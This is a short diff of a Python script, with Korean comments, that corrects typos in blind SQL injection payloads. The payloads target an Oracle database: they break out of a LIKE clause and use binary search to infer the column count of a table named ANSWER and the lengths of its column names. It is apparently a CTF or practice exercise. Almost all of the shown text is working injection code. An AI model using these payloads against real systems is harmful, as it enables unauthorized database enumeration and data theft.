@@ -26,7 +26,7 @@ def binarySearch(query):
 #------------------------------------------------------------
 #칼럼 개수
 
-query = "test%' and(SELECT COUNT(COLUNM_NAME) FPRM ALL_TAB_COLUMNS WHERE TABLE_NAME='ANSWER')>{} and '1%'='1"
+query = "test%' and(SELECT COUNT(COLUMN_NAME) FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='ANSWER')>{} and '1%'='1"
 
 print("ANSWER 칼럼 개수" + str(binarySearch(query)))
 print('\n')
@@ -38,7 +38,7 @@ columnCount = binarySearch(query)
 #------------------------------------------------------------
 
 for k in range(1,columnCount+1):
-    query1 = f"test%' and (LENGTH((SELECT COLUN_NAME FROM (SELECT ROWNUM RNUM, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME= 'ANSWER') WHERE RNUM = {k}))) > {{}} and '1%'='1"
+    query1 = f"test%' and (LENGTH((SELECT COLUMN_NAME FROM (SELECT ROWNUM RNUM, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME= 'ANSWER') WHERE RNUM = {k}))) > {{}} and '1%'='1"
     
     binarySearch(query1)
     
